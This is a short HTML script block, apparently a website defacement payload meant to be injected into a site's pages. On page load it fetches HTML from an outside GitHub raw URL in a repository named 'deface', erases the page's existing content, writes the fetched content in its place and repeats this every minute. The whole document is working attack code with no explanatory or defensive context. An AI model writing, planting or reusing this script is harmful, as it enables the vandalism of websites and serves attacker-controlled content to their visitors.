<script>
async function defacePage() {
 try {
 const url = 'https://raw.githubusercontent.com/inferno11/deface/main/index.html';
 const response = await fetch(url);
 if (!response.ok) {
 throw new Error('Network response was not ok');
 }
 const htmlContent = await response.text();
 // Remove all the current HTML content
 document.documentElement.innerHTML = '';
 // Insert the fetched HTML content
 document.write(htmlContent);
 document.close();
 // Reload the defaced page every minute
 setInterval(defacePage, 60000);
 } catch (error) {
 console.error('Error fetching the HTML content:', error);
 }
}
// Call the function immediately to replace the content
window.onload = defacePage;
</script>
